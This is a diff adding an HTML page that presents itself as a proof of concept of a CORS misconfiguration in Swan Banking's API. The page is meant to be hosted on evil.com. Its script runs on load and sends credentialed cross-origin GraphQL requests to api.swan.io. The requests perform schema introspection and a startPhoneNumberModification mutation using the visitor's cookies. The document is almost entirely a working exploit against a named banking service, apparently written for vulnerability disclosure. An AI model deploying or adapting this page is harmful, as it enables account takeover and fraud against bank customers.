@@ -1,0 +1,63 @@
+<!--  index.html  (must be served from https://evil.com/)  -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Swan CORS Critical PoC</title>
+<style>
+ body {font-family:sans-serif;max-width:900px;margin:2rem auto}
+ pre  {background:#f6f8fa;border:1px solid #ddd;padding:0.75rem;overflow:auto}
+ .ok  {color:#070}.err{color:#c00}
+</style>
+</head>
+<body>
+<h1>Swan Banking &ndash; Critical CORS Misconfiguration PoC</h1>
+
+<p>This page is hosted on <code>https://evil.com</code>.  
+If the browser already holds valid <code>api.swan.io</code> cookies, the two
+cross-origin requests below will succeed <strong>without</strong> any
+<code>X-Swan-Authenticator-Token</code> or JWT.</p>
+
+<h2>1. Schema introspection (unauthenticated)</h2>
+<pre id="introspect">…waiting…</pre>
+
+<h2>2. startPhoneNumberModification (unauthenticated)</h2>
+<pre id="startmod">…waiting…</pre>
+
+<script>
+async function swanFetch(query, target){
+  const res = await fetch(target, {
+    method: "POST",
+    credentials: "include",              // <-- sends victim’s cookies
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({query})
+  });
+  return {status: res.status, body: await res.text()};
+}
+
+(async ()=>{
+  /* 1) unauthenticated schema introspection */
+  const q1 = `{ __schema { queryType { name } } }`;
+  const r1 = await swanFetch(q1, "https://api.swan.io/admin/graphql");
+  document.getElementById("introspect").textContent =
+    "HTTP " + r1.status + "\n" + r1.body;
+
+  /* 2) unauthenticated sensitive mutation */
+  const q2 = `mutation {
+    startPhoneNumberModification(input:{
+      oldPhoneNumber:"+33600000000",
+      newPhoneNumber:"+33612345666"
+    }){
+      __typename
+      ... on StartPhoneNumberModificationSuccessPayload {
+        phoneNumberModification { id }
+      }
+    }
+  }`;
+  const r2 = await swanFetch(q2, "https://api.swan.io/admin-auth/graphql");
+  document.getElementById("startmod").textContent =
+    "HTTP " + r2.status + "\n" + r2.body;
+})();
+</script>
+</body>
+</html>
